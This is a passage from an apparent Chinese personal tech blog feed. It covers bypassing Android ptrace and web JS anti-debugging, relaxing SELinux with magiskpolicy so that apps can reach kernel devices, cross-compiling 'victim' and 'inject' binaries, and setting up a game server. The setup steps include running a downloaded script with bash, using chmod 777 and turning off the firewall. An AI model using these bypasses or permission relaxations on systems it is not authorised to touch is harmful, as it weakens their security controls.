class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (szProcName[<span class="number">0</span>] &amp;&amp; szTargetPNames[<span class="number">0</span>] &amp;&amp; <span class="built_in">strstr</span>(szTargetPNames, szProcName) != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="在fork函数中调用过滤函数"><a href="#在fork函数中调用过滤函数" class="headerlink" title="在fork函数中调用过滤函数"></a>在fork函数中调用过滤函数</h3><p>fork函数开头添加：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="built_in">filter</span>()) <span class="keyword">return</span> <span class="number">-1</span>;</span><br></pre></td></tr></table></figure>
<h3 id="重新编译并打包"><a href="#重新编译并打包" class="headerlink" title="重新编译并打包"></a>重新编译并打包</h3><p>重新编译libc和linker后，打包系统镜像并刷入<br>PS：也可以只替换文件，但是需要注意文件权限设置</p>
<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>将程序包名写入<code>/data/filter</code>，例如<br><code>echo &quot;com.xhy.test&quot; &gt; /data/pkgname</code><br>并设置权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 777 /data/pkgname</span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://topsrc.cn/archives/207/">修改fork.c绕过多进程ptrace反调试</a></p>
]]></content>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>绕过网站js中的debugger反调试</title>
    <url>/2019/09/28/anti-web-js-debugger-code/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>使用开发者工具(F12)分析一个网站时发现：<br>每隔一段时间就会有js代码主动触发调试器断点，妨碍分析。<br>问之度娘，遂得解法。</p>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><h2 id="1-使用控制台对方法进行nop"><a href="#1-使用控制台对方法进行nop" class="headerlink" title="1. 使用控制台对方法进行nop"></a>1. 使用控制台对方法进行nop</h2><p>有两种情况，一种是直接调用debugger，如：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_$gy</span>(<span class="params"></span>)</span>&#123;<span class="keyword">debugger</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>那么控制台执行以下语句即可：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_$gy</span>(<span class="params"></span>)</span>&#123;&#125;</span><br></pre></td></tr></table></figure>
<p>另一种是匿名函数，代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;<span class="keyword">var</span> a = <span class="keyword">new</span> <span class="built_in">Date</span>(); <span class="keyword">debugger</span>; <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Date</span>() - a &gt; <span class="number">100</span>;&#125;())</span><br></pre></td></tr></table></figure>
<p>需要查看调用栈，找到调用进行重定义。具体操作为：<br>双击调用栈中的主调函数，找到函数名，控制台进行nop。</p>
<h2 id="2-禁用所有断点"><a href="#2-禁用所有断点" class="headerlink" title="2. 禁用所有断点"></a>2. 禁用所有断点</h2><blockquote>
<p>这个问题解决起来还是蛮简单的，问题解决只需要一句话：禁止断点。<br>而对应的操作是在Chrome控制台的Source Tab页点击Deactivate breakpoints按钮或者按下Ctrl + f8。</p>
</blockquote>
<p>来自<a href="https://segmentfault.com/a/1190000012359015">突破前端反调试–阻止页面不断debugger</a></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/weixin_42856601/article/details/100758943">如何解决出现debugger无法调试</a><br><a href="https://segmentfault.com/a/1190000012359015">突破前端反调试–阻止页面不断debugger</a></p>
]]></content>
      <tags>
        <tag>经验</tag>
      </tags>
  </entry>
  <entry>
    <title>定制SELinux规则 允许app访问内核模块</title>
    <url>/2022/05/03/app-access-device-by-selinux-rule/</url>
    <content><![CDATA[<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>使用<code>insmod</code>安装内核模块后，在<code>app</code>的<code>Native</code>层访问驱动，提示<code>Permission Denied</code>。<br>设置驱动权限，绕过<code>DAC</code>权限检查：<code>chmod 666 /dev/helloworld</code>。<br>再次调用，仍然失败。<br>执行<code>dmesg -w | grep &quot;avc: denied&quot;</code>，查看<code>SELinux</code>日志。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[23292:logd.auditd]type=1400 audit(1651503112.740:5320): avc: denied &#123; read write &#125; for comm=&quot;exp.hellokernel&quot; name=&quot;helloworld&quot; dev=&quot;tmpfs&quot; ino=297747 scontext=u:r:priv_app:s0:c227,c256,c512,c768 tcontext=u:object_r:device:s0 tclass=chr_file permissive=1</span><br></pre></td></tr></table></figure>
<p>关闭<code>SELinux</code>后，成功调用驱动。</p>
<p>添加<code>allow</code>规则，调用仍失败，查阅资料得知需要设置为<code>mlstrustedsubject</code>。</p>
<p>最终基于<code>magiskpolicy</code>，实现了自定义<code>SELinux</code>规则的添加。</p>
<p>PS：笔者将apk放到了<code>system/priv-app</code>目录下，所以<code>role</code>是<code>priv_app</code>，而非<code>untrusted_app</code>。</p>
<span id="more"></span>
<h2 id="手动添加规则"><a href="#手动添加规则" class="headerlink" title="手动添加规则"></a>手动添加规则</h2><h3 id="方法一：sepolicy-rule"><a href="#方法一：sepolicy-rule" class="headerlink" title="方法一：sepolicy.rule"></a>方法一：sepolicy.rule</h3><p>创建一个<code>Magisk</code>模块，放入<code>sepolicy.rule</code>，将其解压到<code>$MODPATH</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">allow priv_app device chr_file &#123; read write ioctl open getattr map &#125;</span><br><span class="line">attradd priv_app mlstrustedsubject</span><br></pre></td></tr></table></figure>
<h3 id="方法二：命令行"><a href="#方法二：命令行" class="headerlink" title="方法二：命令行"></a>方法二：命令行</h3><p>手动执行，或在<code>Magisk</code>模块的<code>post-fs-data.sh</code>中添加以下命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">magiskpolicy --live &quot;allow priv_app device chr_file &#123; read write ioctl open getattr map &#125;&quot;</span><br><span class="line">magiskpolicy --live &quot;attradd priv_app mlstrustedsubject&quot;</span><br></pre></td></tr></table></figure>

<h4 id="untrusted-app"><a href="#untrusted-app" class="headerlink" title="untrusted_app"></a>untrusted_app</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">magiskpolicy --live &quot;allow untrusted_app device chr_file &#123; read write ioctl open getattr map &#125;&quot;</span><br><span class="line">magiskpolicy --live &quot;attradd untrusted_app mlstrustedsubject&quot;</span><br></pre></td></tr></table></figure>

<h3 id="方法三：重编译Magisk"><a href="#方法三：重编译Magisk" class="headerlink" title="方法三：重编译Magisk"></a>方法三：重编译Magisk</h3><p>修改<code>Magisk</code>源代码，内置<code>SELinux</code>规则</p>
<p>具体可参考<a href="https://pshocker.github.io/2022/08/05/Magisk%E5%86%85%E5%B5%8C%E9%A9%B1%E5%8A%A8%E6%A8%A1%E5%9D%97%E4%B8%94%E5%90%AF%E5%8A%A8%E5%8A%A0%E8%BD%BD/">Magisk内嵌驱动模块且启动加载</a></p>
<h3 id="方法四：重编译内核和系统"><a href="#方法四：重编译内核和系统" class="headerlink" title="方法四：重编译内核和系统"></a>方法四：重编译内核和系统</h3><p>内置内核模块，修改系统的<code>SELinux</code>规则（理论可行，笔者未测试）</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.jianshu.com/p/806a055b50b3">AOSP 8.1 新增/dev设备节点 Selinux的权限设置</a><br><a href="https://www.likecs.com/show-305821532.html">Android/SELinux 添加 AVC 权限</a><br><a href="https://www.jianshu.com/p/9374e4421d38">SELinux 添加一个权限</a><br><a href="https://github.com/Magisk-Modules-Repo/vold-posix/blob/master/common/post-fs-data.sh">vold-posix_post-fs-data.sh</a></p>
]]></content>
      <tags>
        <tag>Android</tag>
        <tag>经验</tag>
        <tag>Kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>apt update 报错 the public key is not available</title>
    <url>/2020/04/16/apt-pk-not-available/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p><code>apt-get update</code>出现<code>The following signatures couldn&#39;t be verified because the public key is not available</code>错误，则需要手动添加key</p>
<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>执行以下命令：(<code>B02C46DF417A0893</code>替换为报错信息中显示的值)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo gpg --keyserver keyserver.ubuntu.com --recv B02C46DF417A0893</span><br><span class="line">sudo gpg --export --armor B02C46DF417A0893 | sudo apt-key add -</span><br><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/zhuiqiuzhuoyue583/article/details/90597499">解决GPG error: The following signatures couldn’t be verified because the public key is not available</a></p>
]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>使用CMake交叉编译Android ARM&amp;ARM64 程序</title>
    <url>/2021/08/22/arm-compile-without-as/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>脱离<code>Android Studio</code>，使用<code>CMake</code>交叉编译，生成<code>Android ARM&amp;ARM64</code>可执行文件及公共库。</p>
<span id="more"></span>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p><code>CMake 3.10.2、3.18.1</code>、<code>NDK 21.4.7075529、22.1.7171670</code>（从<code>Android Studio</code>的<code>SDK Manager</code>中下载）<br><code>ABI</code>:<code>armeabi-v7a</code>、<code>arm64-v8a</code></p>
<h2 id="CMakeLists-txt"><a href="#CMakeLists-txt" class="headerlink" title="CMakeLists.txt"></a>CMakeLists.txt</h2><h3 id="可执行文件"><a href="#可执行文件" class="headerlink" title="可执行文件"></a>可执行文件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmake_minimum_required(VERSION 3.10.2)</span><br><span class="line"></span><br><span class="line">project(victim)</span><br><span class="line"></span><br><span class="line">add_executable(victim victim.cpp)</span><br></pre></td></tr></table></figure>

<h3 id="共享库"><a href="#共享库" class="headerlink" title="共享库"></a>共享库</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmake_minimum_required(VERSION 3.18.1)</span><br><span class="line"></span><br><span class="line">project(inject)</span><br><span class="line"></span><br><span class="line">add_library(inject SHARED inject.cpp)</span><br><span class="line"></span><br><span class="line">target_link_libraries(inject log)</span><br></pre></td></tr></table></figure>

<h2 id="compile-bat"><a href="#compile-bat" class="headerlink" title="compile.bat"></a>compile.bat</h2><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> abi=arm64-v8a</span><br><span class="line"><span class="built_in">set</span> CMAKE_PATH=D:\Tools\AndroidSDK\cmake\<span class="number">3</span>.<span class="number">18</span>.<span class="number">1</span>\bin</span><br><span class="line"><span class="built_in">set</span> NDK_HOME=D:\Tools\AndroidSDK\ndk\<span class="number">21</span>.<span class="number">4</span>.<span class="number">7075529</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">exist</span> <span class="variable">%abi%</span> <span class="built_in">md</span> <span class="variable">%abi%</span></span><br><span class="line"><span class="built_in">cd</span> <span class="variable">%abi%</span></span><br><span class="line"><span class="built_in">del</span> /q *.*</span><br><span class="line"></span><br><span class="line"><span class="variable">%CMAKE_PATH%</span>\cmake ^</span><br><span class="line">  -DANDROID_ABI=<span class="variable">%abi%</span> ^</span><br><span class="line">  -DANDROID_NDK=<span class="variable">%NDK_HOME%</span> ^</span><br><span class="line">  -DCMAKE_BUILD_TYPE=Debug ^</span><br><span class="line">  -DCMAKE_TOOLCHAIN_FILE=<span class="variable">%NDK_HOME%</span>/build/cmake/android.toolchain.cmake ^</span><br><span class="line">  -DANDROID_NATIVE_API_LEVEL=<span class="number">16</span> ^</span><br><span class="line">  -DANDROID_TOOLCHAIN=clang -DCMAKE_GENERATOR=&quot;Ninja&quot; ^</span><br><span class="line">  -DCMAKE_MAKE_PROGRAM=<span class="variable">%CMAKE_PATH%</span>/ninja ^</span><br><span class="line">  ..</span><br><span class="line"></span><br><span class="line"><span class="variable">%CMAKE_PATH%</span>/ninja</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.52pojie.cn/thread-1486586-1-1.html">实现简易安卓inlinehook</a><br><a href="https://blog.csdn.net/lljjyy001/article/details/77866049">脱离AS在windows下使用CMake交叉编译for Android</a></p>
]]></content>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>方舟生存进化 Linux(CentOS) 开服、mod安装</title>
    <url>/2020/03/03/ark-server-linux/</url>
    <content><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>阿里云服务器，CentOS 7.7 64位， 2核CPU，4G内存，4G交换空间</p>
<h3 id="交换空间配置"><a href="#交换空间配置" class="headerlink" title="交换空间配置"></a>交换空间配置</h3><p>见<a href="https://blog.xhyeax.com/2020/03/25/linux-set-swapfile/">Linux配置虚拟内存文件</a></p>
<h2 id="开服准备"><a href="#开服准备" class="headerlink" title="开服准备"></a>开服准备</h2><h3 id="创建用户并设置密码"><a href="#创建用户并设置密码" class="headerlink" title="创建用户并设置密码"></a>创建用户并设置密码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adduser arkserver</span><br><span class="line">passwd arkserver</span><br></pre></td></tr></table></figure>
<h3 id="开放以下端口"><a href="#开放以下端口" class="headerlink" title="开放以下端口"></a>开放以下端口</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">7777/udp</span><br><span class="line">27015/udp</span><br></pre></td></tr></table></figure>
<p>PS：云服务器一般是在安全组规则中设置放行<br>同时关闭系统自带的防火墙（root用户执行<code>service firewalld stop</code>）</p>
<span id="more"></span>
<h4 id="可选-使用原始套接字连接"><a href="#可选-使用原始套接字连接" class="headerlink" title="(可选)使用原始套接字连接"></a>(可选)使用原始套接字连接</h4><p>安装完成后，开放端口：<br><code>7778/udp</code>（游戏端口号+1）<br>并在<code>arkserver.cfg</code>中添加启动参数<code>?bRawSockets</code>，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fn_parms()&#123;</span><br><span class="line">parms=&quot;\&quot;$&#123;defaultmap&#125;?AltSaveDirectoryName=$&#123;defaultmap&#125;?listen?MultiHome=$&#123;ip&#125;?MaxPlayers=$&#123;maxplayers&#125;?QueryPort=$&#123;queryport&#125;?RCONPort=$&#123;rconport&#125;?Port=$&#123;port&#125;?bRawSockets -automanagedmods\&quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="修改文件描述符限制"><a href="#修改文件描述符限制" class="headerlink" title="修改文件描述符限制"></a>修改文件描述符限制</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;fs.file-max=100000&quot; &gt;&gt; /etc/sysctl.conf</span><br><span class="line">sysctl -p /etc/sysctl.conf</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;* soft nofile 1000000&quot; &gt;&gt; /etc/security/limits.conf</span><br><span class="line">echo &quot;* hard nofile 1000000&quot; &gt;&gt; /etc/security/limits.conf</span><br></pre></td></tr></table></figure>
<h3 id="切换用户"><a href="#切换用户" class="headerlink" title="切换用户"></a>切换用户</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su - arkserver</span><br></pre></td></tr></table></figure>
<h3 id="下载并运行一键安装脚本"><a href="#下载并运行一键安装脚本" class="headerlink" title="下载并运行一键安装脚本"></a>下载并运行一键安装脚本</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget -O linuxgsm.sh https://linuxgsm.sh &amp;&amp; chmod +x linuxgsm.sh &amp;&amp; bash linuxgsm.sh arkserver</span><br></pre></td></tr></table></figure>
<p>PS：如果访问<code>raw.githubusercontent.com</code>经常出错，可修改hosts文件（<code>/etc/hosts</code>），添加以下内容（root用户）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">199.232.4.133 raw.githubusercontent.com</span><br></pre></td></tr></table></figure>
<h3 id="运行安装文件"><a href="#运行安装文件" class="headerlink" title="运行安装文件"></a>运行安装文件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./arkserver install</span><br></pre></td></tr></table></figure>
<p>一路回车即可。</p>
<h3 id="安装过程中可能出现的问题"><a href="#安装过程中可能出现的问题" class="headerlink" title="安装过程中可能出现的问题"></a>安装过程中可能出现的问题</h3><h4 id="出现-ERROR、FAIL"><a href="#出现-ERROR、FAIL" class="headerlink" title="出现 ERROR、FAIL"></a>出现 ERROR、FAIL</h4><p>一般是网络问题导致的下载失败，删除报错的脚本后重新执行<code>./dstserver install</code></p>
<h4 id="依赖程序包缺失"><a href="#依赖程序包缺失" class="headerlink" title="依赖程序包缺失"></a>依赖程序包缺失</h4><p>表现为check_deps.sh执行时，出现红字<br>使用yum命令安装缺失程序包即可<br>如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install python3 jq -y</span><br></pre></td></tr></table></figure>
<p>之后再次执行<code>./arkserver install</code></p>
<h4 id="建立SteamCMD软链接失败"><a href="#建立SteamCMD软链接失败" class="headerlink" title="建立SteamCMD软链接失败"></a>建立SteamCMD软链接失败</h4><p>如<code>ln: failed to create symbolic link &#39;~/serverfiles/Engine/Binaries/ThirdParty/SteamCMD/Linux&#39;: No such file or directory</code><br>建议再次执行<code>./arkserver install</code>尝试<br>也可手动安装SteamCMD，见文章最末尾</p>
<h2 id="开服相关"><a href="#开服相关" class="headerlink" title="开服相关"></a>开服相关</h2><h3 id="编辑配置文件"><a href="#编辑配置文件" class="headerlink" title="编辑配置文件"></a>编辑配置文件</h3><p>可通过编辑<code>Game.ini</code>和<code>GameUserSettings.ini</code>文件（位于<code>/home/arkserver/serverfiles/ShooterGame/Saved/Config/LinuxServer</code>）修改服务器配置<br>笔者直接复制PC端<code>...\steamapps\common\ARK\ShooterGame\Saved\Config\WindowsNoEditor</code>文件夹下的这两个文件到服务器上</p>
<h4 id="设置加入服务器密码和管理员密码"><a href="#设置加入服务器密码和管理员密码" class="headerlink" title="设置加入服务器密码和管理员密码"></a>设置加入服务器密码和管理员密码</h4><p>在<code>GameUserSettings.ini</code>文件<code>[ServerSettings]</code>下添加：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ServerPassword=123456</span><br><span class="line">ServerAdminPassword=654321</span><br></pre></td></tr></table></figure>
<p>在游戏内按Tab调出控制台，输入<code>enablecheats 管理员密码</code>启动作弊模式<br>之后输入指令即可（如<code>cheat fly</code>）</p>
<h4 id="修改服务器名称："><a href="#修改服务器名称：" class="headerlink" title="修改服务器名称："></a>修改服务器名称：</h4><p><code>GameUserSettings.ini</code>文件中添加：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[SessionSettings]</span><br><span class="line">SessionName=ArkServer</span><br></pre></td></tr></table></figure>
<p>更多配置参数可查看<a href="https://ark.gamepedia.com/Server_Configuration">官方wiki: Server Configuration</a></p>
<h3 id="更换地图"><a href="#更换地图" class="headerlink" title="更换地图"></a>更换地图</h3><p><code>lgsm/config-lgsm/arkserver/arkserver.cfg</code>文件添加一行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">defaultmap=&quot;MAP_NAME_HERE&quot;</span><br></pre></td></tr></table></figure>
<p><code>MAP_NAME_HERE</code>替换成地图名<br>地图名：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TheIsland</span><br><span class="line">TheCenter</span><br><span class="line">Ragnarok</span><br><span class="line">CrystalIsles</span><br><span class="line">ScorchedEarth_P</span><br><span class="line">Aberration_P</span><br><span class="line">Extinction</span><br><span class="line">Valguero_P</span><br></pre></td></tr></table></figure>
<h3 id="设置人数"><a href="#设置人数" class="headerlink" title="设置人数"></a>设置人数</h3><p><code>lgsm/config-lgsm/arkserver/arkserver.cfg</code>文件添加一行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">maxplayers=10</span><br></pre></td></tr></table></figure>
<h3 id="其他配置"><a href="#其他配置" class="headerlink" title="其他配置"></a>其他配置</h3><h4 id="修改端口号（以1234为例）："><a href="#修改端口号（以1234为例）：" class="headerlink" title="修改端口号（以1234为例）："></a>修改端口号（以1234为例）：</h4><p>添加</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">port=1234</span><br></pre></td></tr></table></figure>
<h4 id="设置启动时自动更新"><a href="#设置启动时自动更新" class="headerlink" title="设置启动时自动更新"></a>设置启动时自动更新</h4><p>添加</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">updateonstart=&quot;on&quot;</span><br></pre></td></tr></table></figure>
<h4 id="关闭反作弊（BattleEye）"><a href="#关闭反作弊（BattleEye）" class="headerlink" title="关闭反作弊（BattleEye）"></a>关闭反作弊（BattleEye）</h4><p>在<code>arkserver.cfg</code>中增加启动参数<code>-NoBattlEye</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fn_parms()&#123;</span><br><span class="line">parms=&quot;\&quot;$&#123;defaultmap&#125;?AltSaveDirectoryName=$&#123;defaultmap&#125;?listen?MultiHome=$&#123;ip&#125;?MaxPlayers=$&#123;maxplayers&#125;?QueryPort=$&#123;queryport&#125;?RCONPort=$&#123;rconport&#125;?Port=$&#123;port&#125; -NoBattlEye -automanagedmods\&quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>更多配置可参考<code>/home/arkserver/lgsm/config-lgsm/arkserver/_default.cfg</code>文件，将需要修改的内容添加进<code>arkserver.cfg</code>即可</p>
<h3 id="启动服务器"><a href="#启动服务器" class="headerlink" title="启动服务器"></a>启动服务器</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./arkserver start</span><br></pre></td></tr></table></figure>
<p>PS：启动服务器需要时间，耐心等待。</p>
<h3 id="停止服务器"><a href="#停止服务器" class="headerlink" title="停止服务器"></a>停止服务器</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./arkserver stop</span><br></pre></td></tr></table></figure>
<h3 id="更新服务器版本"><a href="#更新服务器版本" class="headerlink" title="更新服务器版本"></a>更新服务器版本</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./arkserver update</span><br></pre></td></tr></table></figure>
<h2 id="加入服务器"><a href="#加入服务器" class="headerlink" title="加入服务器"></a>加入服务器</h2><h3 id="手动收藏"><a href="#手动收藏" class="headerlink" title="手动收藏"></a>手动收藏</h3><p>打开steam主窗口，左上角<code>视图</code>-<code>服务器</code>（如图所示）<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/ark-server.png"><br>在<code>收藏夹</code>中点击<code>添加服务器</code>，输入地址后点击<code>在此地址上寻找游戏</code>，<code>将选定的游戏添加到收藏夹</code>，然后<code>连接</code>即可。<br>之后可直接在游戏内通过收藏夹连接。</p>
<h3 id="通过steam快捷方式连接"><a href="#通过steam快捷方式连接" class="headerlink" title="通过steam快捷方式连接"></a>通过steam快捷方式连接</h3><p>建立.bat文件（<code>1.2.3.4</code>替换为ip地址或域名，多个地图需要指定端口）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">start steam://connect/1.2.3.4</span><br></pre></td></tr></table></figure>
<h2 id="mod安装"><a href="#mod安装" class="headerlink" title="mod安装"></a>mod安装</h2><h3 id="1-自动从创意工坊下载并安装"><a href="#1-自动从创意工坊下载并安装" class="headerlink" title="1.自动从创意工坊下载并安装"></a>1.自动从创意工坊下载并安装</h3><p>编辑<code>Game.ini</code>文件，增加<code>ModInstaller</code>属性（从而自动下载并安装mod）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[ModInstaller]</span><br><span class="line">ModIDS=[workshopID]</span><br><span class="line">ModIDS=[workshopID]</span><br><span class="line">ModIDS=[workshopID]</span><br><span class="line">ModIDS=[workshopID]</span><br></pre></td></tr></table></figure>
<p>编辑<code>GameUserSettings.ini</code>文件，<code>[ServerSettings]</code>下，<code>ActiveMods</code>字段：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ActiveMods=[workshopID],[workshopID],[workshopID],[workshopID]</span><br></pre></td></tr></table></figure>
<p>最后重启服务器：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./arkserver restart</span><br></pre></td></tr></table></figure>
<h3 id="2-手动安装（可能会安装失败，建议使用方法1）"><a href="#2-手动安装（可能会安装失败，建议使用方法1）" class="headerlink" title="2. 手动安装（可能会安装失败，建议使用方法1）"></a>2. 手动安装（可能会安装失败，建议使用方法1）</h3><p>把PC上<code>steamapps\common\ARK\ShooterGame\Content\Mods</code>下对应的modID文件夹和.mod文件<br>复制到<code>/home/arkserver/serverfiles/ShooterGame/Content/Mods</code>下，再编辑<code>GameUserSettings.ini</code>文件，<code>[ServerSettings]</code>下，<code>ActiveMods</code>字段，重启服务器即可<br>PS：mod安装也需要时间，耐心等待</p>
<h2 id="其他内容"><a href="#其他内容" class="headerlink" title="其他内容"></a>其他内容</h2><h3 id="手动安装SteamCMD"><a href="#手动安装SteamCMD" class="headerlink" title="手动安装SteamCMD"></a>手动安装SteamCMD</h3><p>未正常安装SteamCMD，会导致无法自动下载并安装MOD，且无法更新服务器版本。<br>检查<code>/home/arkserver/serverfiles/Engine/Binaries/ThirdParty/SteamCMD</code>下是否有Linux文件，如果没有，则<br>先依次建立对应文件夹，再执行以下命令进行下载，并建立软链接：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd ~</span><br><span class="line">mkdir steamcmd</span><br><span class="line">cd steamcmd</span><br><span class="line">wget https://steamcdn-a.akamaihd.net/client/installer/steamcmd_linux.tar.gz</span><br><span class="line">tar -xf steamcmd_linux.tar.gz</span><br><span class="line">ln -s ~/steamcmd/ ~/serverfiles/Engine/Binaries/ThirdParty/SteamCMD/Linux</span><br></pre></td></tr></table></figure>
<h3 id="查看端口占用"><a href="#查看端口占用" class="headerlink" title="查看端口占用"></a>查看端口占用</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -atunp | grep ShooterGame</span><br></pre></td></tr></table></figure>
<h3 id="查询开服情况脚本"><a href="#查询开服情况脚本" class="headerlink" title="查询开服情况脚本"></a>查询开服情况脚本</h3><p>注：需根据开服端口替换port变量</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> time,sys,os,subprocess</span><br><span class="line"></span><br><span class="line">port=<span class="number">7777</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        out=subprocess.check_output(<span class="string">&#x27;netstat -atunp | grep ShooterGame&#x27;</span>,shell=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">except</span> subprocess.CalledProcessError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error: Server is not running!&quot;</span>)</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line">    out = <span class="built_in">str</span>(out,<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(out)</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">str</span>(port+<span class="number">1</span>) <span class="keyword">in</span> out):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;开服完成&quot;</span>)</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    check()</span><br><span class="line">    time.sleep(<span class="number">10</span>)</span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://docs.linuxgsm.com/game-servers/ark-survival-evolved">Ark Survival Evolved - LinuxGSM_</a><br><a href="https://ark.gamepedia.com/Dedicated_Server_Setup#Linux">Dedicated_Server_Setup#Linux</a><br><a href="https://ark.gamepedia.com/Server_Configuration">Server_Configuration</a></p>
]]></content>
      <tags>
        <tag>经验</tag>
      </tags>
  </entry>
  <entry>
    <title>ARM &amp; ARM64 指令集</title>
    <url>/2021/11/28/arm-instruction-set/</url>
    <content><![CDATA[<h2 id="ARM"><a href="#ARM" class="headerlink" title="ARM"></a>ARM</h2><p><a href="https://developer.arm.com/documentation/ddi0406/latest/">ARM Architecture Reference Manual ARMv7-A and ARMv7-R edition</a></p>
<p><code>8.8 Alphabetical list of instructions</code></p>
